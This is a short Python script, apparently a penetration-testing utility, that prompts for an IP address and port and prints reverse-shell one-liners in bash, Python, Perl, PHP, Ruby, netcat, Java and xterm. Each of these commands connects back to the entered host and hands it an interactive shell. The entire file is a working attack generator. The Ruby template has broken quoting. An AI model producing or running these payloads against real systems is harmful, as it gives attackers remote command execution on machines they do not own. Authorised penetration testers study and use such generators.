#Author : Prashant Saini
#Language : Python3
#issued on date : 15/11/2019 

#!/usr/bin/python3
import colorama
from colorama import Fore,Style
import os
import sys
from time import sleep

ip = str("NULL")
port = str("NULL")
os.system('clear')
banner = Fore.YELLOW + "\t\t\tREVERSE SHELLS " + Fore.RED + " Generator (Prashant Saini)"
for i in banner:
    print(i,end='')
    sys.stdout.flush()
    sleep(0.03)
def bash():
    print(Fore.GREEN + "\nbash -i >& /dev/tcp/"+ip+"/"+port +" 0>&1")
    main_menu()
def python():
    print(Fore.GREEN + "\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" %(ip,port))    
    main_menu()
def perl():
    print(Fore.GREEN + "\nperl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" %(ip,port))
    main_menu()
def php():
    print(Fore.GREEN + "\nphp -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" %(ip,port))
    main_menu()
def ruby():
    print(Fore.GREEN + "\nruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'")
    main_menu()
def netcat():
    print(Fore.GREEN + "\nnc -e /bin/sh %s %s" %(ip,port))
    main_menu()
def java():
    print(Fore.GREEN + '''\n\tr = Runtime.getRuntime()
        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
        p.waitFor()''' %(ip,port))
    main_menu()
def xterm():
    print(Fore.GREEN + "\nxterm -display %s:%s" %(ip,port))
    main_menu()

def main_menu():
    print(Fore.GREEN + "\nThe current ip:="+ip + Fore.GREEN + "\tThe current port:="+port  +"\n" )
    print(Fore.YELLOW + "[1].BASH REVERSE SHELL\n")
    print(Fore.RED +    "[2].PYTHON REVERSE SHELL\n")
    print(Fore.GREEN +  "[3].PERL REVERSE SHELL\n")
    print(Fore.YELLOW + "[4].PHP REVERSE SHELL\n")
    print(Fore.RED +    "[5].RUBY REVERSE SHELL\n")
    print(Fore.YELLOW + "[6].NETCAT REVERSE SHELL\n")
    print(Fore.GREEN +  "[7].JAVA REVERSE SHELL\n")
    print(Fore.RED +    "[8].XTERM REVERSE SHELL\n")
    print(Fore.YELLOW + "[9]Use a different PORT\n")
    print(Fore.GREEN +  "[10].EXIT\n")
    choice = int(input(Fore.RED + "Enter YOUR CHOICE:="))
    print_shell(choice)
def print_shell(choice):
    if choice == 1:
        {
            bash()
        }
    elif(choice == 2):
        {
            python()
        }
    elif(choice == 3):
        {
            perl()
        }
    elif(choice == 4):
        {
            php()
        }
    elif(choice == 5):
        {
            ruby()
        }
    elif(choice == 6):
        {
            netcat()
        }
    elif(choice == 7):
        {
             java()
        }
    elif(choice == 8):
        {
            xterm()
        }
    elif(choice == 9):
        {
            change_port()
        }
    elif(choice == 10):
        {
            exit(0)
        }
    else:
        {
            print("\n\t\t[-]Wrong Choice")
            
        }
def change_port():
    global port
    port = input(Fore.GREEN + "Enter the new Port:=")
    main_menu()

ip = input("\n[+]Enter the ip:=")
port = input("[+]Enter the port :=")
print("\n\t\tWhich shell you want ?? \n")
main_menu()




